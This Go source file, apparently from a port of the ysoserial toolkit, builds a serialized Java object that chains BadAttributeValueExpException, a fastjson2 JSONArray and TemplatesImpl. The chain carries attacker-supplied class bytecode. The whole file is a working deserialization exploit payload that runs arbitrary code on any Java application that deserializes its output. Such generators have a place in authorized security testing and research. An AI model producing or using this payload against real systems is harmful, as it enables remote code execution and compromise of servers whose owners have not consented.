package ysoserial

func Fastjson2(bytecodes []byte) []byte {
	return ClassObject{
		name:             "javax.management.BadAttributeValueExpException",
		serialVersionUID: -3105272988410493376,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{"Ljava/lang/Object;", "val", ClassObject{
				name:             "com.alibaba.fastjson2.JSONArray",
				serialVersionUID: 1,
				classDescFlags:   SC_SERIALIZABLE,
				fields:           []Field{},
				objectAnnotations: interfaces(
					ClassObject{
						name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
						serialVersionUID: 673094361519270707,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{Integer, "_indentNumber", 0},
							{Integer, "_transletIndex", 0},
							{"[[B", "_bytecodes", ArrayObject{
								name:             "[[B",
								serialVersionUID: 5475560301672258359,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									ArrayObject{
										name:             "[B",
										serialVersionUID: -5984413125824719648,
										classDescFlags:   SC_SERIALIZABLE,
										values:           bytesToInterfaces(bytecodes),
										annotations:      interfaces(),
									},
									ArrayObject{
										name:             "[B",
										serialVersionUID: -5984413125824719648,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x3f), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x63), byte(0x61), byte(0x74), byte(0x61), byte(0x6c), byte(0x69), byte(0x6e), byte(0x61), byte(0x2f), byte(0x63), byte(0x6f), byte(0x6c), byte(0x65), byte(0x63), byte(0x74), byte(0x69), byte(0x6f), byte(0x6e), byte(0x73), byte(0x34), byte(0x2f), byte(0x6d), byte(0x61), byte(0x70), byte(0x2f), byte(0x41), byte(0x62), byte(0x73), byte(0x74), byte(0x72), byte(0x61), byte(0x63), byte(0x74), byte(0x53), byte(0x6f), byte(0x72), byte(0x74), byte(0x65), byte(0x64), byte(0x4d), byte(0x61), byte(0x70), byte(0x44), byte(0x65), byte(0x63), byte(0x6f), byte(0x72), byte(0x61), byte(0x74), byte(0x6f), byte(0x72), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x1f), byte(0x41), byte(0x62), byte(0x73), byte(0x74), byte(0x72), byte(0x61), byte(0x63), byte(0x74), byte(0x53), byte(0x6f), byte(0x72), byte(0x74), byte(0x65), byte(0x64), byte(0x4d), byte(0x61), byte(0x70), byte(0x44), byte(0x65), byte(0x63), byte(0x6f), byte(0x72), byte(0x61), byte(0x74), byte(0x6f), byte(0x72), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
										),
										annotations: interfaces(),
									},
								),
							}},
							{"[Ljava/lang/Class;", "_class", nil},
							{Object, "_name", "PXHRBOVA"},
							{"Ljava/util/Properties;", "_outputProperties", nil},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					},
				),
				super: nil,
			}},
		},
		objectAnnotations: interfaces(),
		super: &ClassObject{
			name:              "java.lang.Exception",
			serialVersionUID:  -3387516993124229948,
			classDescFlags:    SC_SERIALIZABLE,
			fields:            []Field{},
			objectAnnotations: interfaces(),
			super: &ClassObject{
				name:             "java.lang.Throwable",
				serialVersionUID: -3042686055658047285,
				classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Throwable;", "cause", nil},
					{"Ljava/lang/String;", "detailMessage", nil},
					{"[Ljava/lang/StackTraceElement;", "stackTrace", ArrayObject{
						name:             "[Ljava.lang.StackTraceElement;",
						serialVersionUID: 163864874655228473,
						classDescFlags:   SC_SERIALIZABLE,
						values: interfaces(
							ClassObject{
								name:             "java.lang.StackTraceElement",
								serialVersionUID: 6992337162326171013,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 32},
									{Object, "declaringClass", "org.Nu1r.ysuserial.payloads.gadgets.Fastjson2"},
									{Object, "fileName", "Fastjson2.java"},
									{Object, "methodName", "getObject"},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							},
							ClassObject{
								name:             "java.lang.StackTraceElement",
								serialVersionUID: 6992337162326171013,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 153},
									{Object, "declaringClass", "org.Nu1r.ysuserial.GeneratePayload"},
									{Object, "fileName", "GeneratePayload.java"},
									{Object, "methodName", "main"},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							},
						),
					},
					},
					{"Ljava/util/List;", "suppressedExceptions", ClassObject{
						name:             "java.util.Collections$UnmodifiableList",
						serialVersionUID: -283967356065247728,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{Object, "list", nil},
						},
						objectAnnotations: interfaces(),
						super: &ClassObject{
							name:             "java.util.Collections$UnmodifiableCollection",
							serialVersionUID: 1820017752578914078,
							classDescFlags:   SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Collection;", "c", ClassObject{
									name:             "java.util.ArrayList",
									serialVersionUID: 8683452581122892189,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Integer, "size", 0},
									},
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x00},
									),
									super: nil,
								},
								},
							},
							objectAnnotations: interfaces(),
							super:             nil,
						},
					}},
				},
				objectAnnotations: interfaces(),
				super:             nil,
			},
		},
	}.SerializeWithMagicHeader()
}
